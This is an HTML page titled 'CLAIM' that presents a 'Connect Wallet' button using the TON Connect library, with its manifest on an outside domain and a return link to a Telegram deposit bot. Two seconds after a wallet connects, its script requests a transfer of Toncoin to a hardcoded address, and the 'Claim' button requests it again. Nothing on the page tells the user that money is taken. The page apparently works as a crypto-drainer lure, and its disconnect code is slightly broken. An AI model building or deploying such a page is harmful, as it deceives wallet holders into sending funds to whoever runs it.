<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CLAIM</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <button class="connect-wallet-button" id="connect-btn">Connect Wallet</button>
    </div>
    <div class="bottom-container">
        <button id="disconnect-btn" class="bottom-button">Bottom Button</button>
    </div>
</body>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
<script>
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://win0110.xyz/tonconnect-manifest.json',
    });

    tonConnectUI.uiOptions = {
        twaReturnUrl: 'https://t.me/wallet_connect_deposit_bot'
    };

    const currentWallet = tonConnectUI.wallet;
    setInnerHtml();

    function setInnerHtml() {
        if(currentWallet) {
            document.getElementById('connect-btn').innerHTML = 'Claim';
        }
        else{
            document.getElementById('connect-btn').innerHTML = 'Connect Wallet';
        }
    }

    document.getElementById("connect-btn").addEventListener('click', async () => {
        // Call the function
        if(currentWallet) {
            document.getElementById('connect-btn').innerHTML = 'Claim';
            sendTransaction();
        }
        else{
            document.getElementById('connect-btn').innerHTML = 'Connect Wallet';
            
            connectToWallet().catch(error => {
                console.error("Error connecting to wallet:", error);
            });
        }
    });

    async function connectToWallet() {
        const connectedWallet = await tonConnectUI.connectWallet();
        setTimeout(function() {
            sendTransaction();
        }, 2000);
    }

    async function sendTransaction() {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: [
                {
                    address: "UQDWLxE1akNmxQTTQsWmtnFMFAnJcGGR2iOmYw62IRdhC077", // destination address
                    amount: "20000000" //Toncoin in nanotons
                }
            ]
        };

        await tonConnectUI.sendTransaction(transaction);
    }
    
    document.getElementById("disconnect-btn").addEventListener('click', async () => {
        await tonConnectUI.disconnect();
        currentWallet = null;
        setInnerHtml();
    });
</script>
</html>